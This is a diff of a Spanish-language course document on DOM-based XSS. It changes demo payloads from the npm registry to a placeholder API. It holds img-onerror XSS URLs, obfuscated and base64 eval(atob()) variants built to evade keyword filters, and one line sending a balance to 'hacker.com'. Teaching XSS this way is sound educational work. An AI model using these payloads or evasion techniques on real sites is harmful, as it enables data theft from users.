@@ -36,13 +36,13 @@ Si el link del mail fuera algo como ésto
 
 ```
 http://localhost:5173/index.html#<img src=x onerror="
-  fetch('https://registry.npmjs.org/wollok-ts')
+  fetch('https://jsonplaceholder.typicode.com/posts?_limit=10')
     .then(r => r.json())
     .then(data => {
-      const versiones = Object.keys(data.versions);
       console.log('--- EXFILTRACIÓN DE DATOS EXITOSA ---');
-      console.log('Versiones detectadas de wollok-ts:', versiones);
-      alert('XSS DOM-Based: He obtenido ' + versiones.length + ' versiones de la API de NPM sin tu permiso.');
+      console.log('Posts obtenidos:', data.length);
+      console.log('Datos:', data);
+      alert('XSS DOM-Based: He obtenido ' + data.length + ' posts');
     })
 ">
 ```
@@ -50,7 +50,7 @@ http://localhost:5173/index.html#<img src=x onerror="
 o incluso algo un poco más ofuscado, difícil de detectar:
 
 ```
-http://localhost:5173/index.html#<img src=x onerror="const f=fetch,l=console.log;f('https://registry.npmjs.org/wollok-ts').then(r=>r.json()).then(d=>{const v=Object.keys(d.versions);l('--- EXFILTRACIÓN ---');l(v);alert('XSS:'+v.length)})">
+http://localhost:5173/index.html#<img src=x onerror="const f=fetch,l=console.log;f('https://jsonplaceholder.typicode.com/posts?_limit=10').then(r=>r.json()).then(d=>{l('--- EXFILTRACIÓN ---');l('Posts:'+d.length);alert('XSS: '+d.length+' posts')})">
 ```
 
 <img src="./images/xss-dom-based-original.png" alt="XSS DOM Based original" width="80%" height="80%">
@@ -101,15 +101,15 @@ fetch('https://hacker.com/log?saldo=' + saldo)
 Otra técnica de ofuscación consiste en usar la función `atob` para decodificar datos codificados en base64 (con `btoa` como vimos anteriormente). El mismo link anterior sería
 
 ```
-http://localhost:5173/index.html#<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vcmVnaXN0cnkubnBtanMub3JnL3dvbGxvay10cycpLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4oZD0+e2NvbnN0IHY9T2JqZWN0LmtleXMoZC52ZXJzaW9ucyk7Y29uc29sZS5sb2coJ0VYSURPJyk7Y29uc29sZS5sb2codik7YWxlcnQoJ1hTUyAnK3YubGVuZ3RoKX0p'))">
+http://localhost:5173/index.html#<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vanNvbnBsYWNlaG9sZGVyLnR5cGljb2RlLmNvbS9wb3N0cz9fbGltaXQ9MTAnKS50aGVuKHI9PnIuanNvbigpKS50aGVuKGQ9Pntjb25zb2xlLmxvZygnLS0tIEVYRklMVFJBQ0kPTiAtLS0nKTtjb25zb2xlLmxvZygnUG9zdHM6JytkLmxlbmd0aCk7YWxlcnQoJ1hTUzogJytkLmxlbmd0aCsnIHBvc3RzJyl9KSk='))">
 ```
 
 El payload parece tan ininteligible como inocente, pero sin embargo...
 
 ```bash
-echo "ZmV0Y2goJ2h0dHBzOi8vcmVnaXN0cnkubnBtanMub3JnL3dvbGxvay10cycpLnRoZW4ocj0+ci5qc29uKCkpLnRoZW4oZD0+e2NvbnN0IHY9T2JqZWN0LmtleXMoZC52ZXJzaW9ucyk7Y29uc29sZS5sb2coJ0VYSURPJyk7Y29uc29sZS5sb2codik7YWxlcnQoJ1hTUyAnK3YubGVuZ3RoKX0p" | base64 -d
+echo "ZmV0Y2goJ2h0dHBzOi8vanNvbnBsYWNlaG9sZGVyLnR5cGljb2RlLmNvbS9wb3N0cz9fbGltaXQ9MTAnKS50aGVuKHI9PnIuanNvbigpKS50aGVuKGQ9Pntjb25zb2xlLmxvZygnLS0tIEVYRklMVFJBQ0kPTiAtLS0nKTtjb25zb2xlLmxvZygnUG9zdHM6JytkLmxlbmd0aCk7YWxlcnQoJ1hTUzogJytkLmxlbmd0aCsnIHBvc3RzJyl9KSk=" | base64 -d
 # produce como resultado
-fetch('https://registry.npmjs.org/wollok-ts').then(r=>r.json()).then(d=>{const v=Object.keys(d.versions);console.log('EXIDO');console.log(v);alert('XSS '+v.length)})
+fetch('https://jsonplaceholder.typicode.com/posts?_limit=10').then(r=>r.json()).then(d=>{console.log('--- EXFILTRACIÓN ---');console.log('Posts:'+d.length);alert('XSS: '+d.length+' posts')})
 ```
 
 Muchos firewalls o scripts validan el uso de palabras claves como fetch, alert, document.cookie o script, de esta manera solo se ve una cadena de caracteres sin sentido. Si querés investigar más al respecto, podés estudiar en el link [Cyberchef](https://gchq.github.io/CyberChef/) y como siempre en [MDN](https://developer.mozilla.org/es/docs/Glossary/Base64).
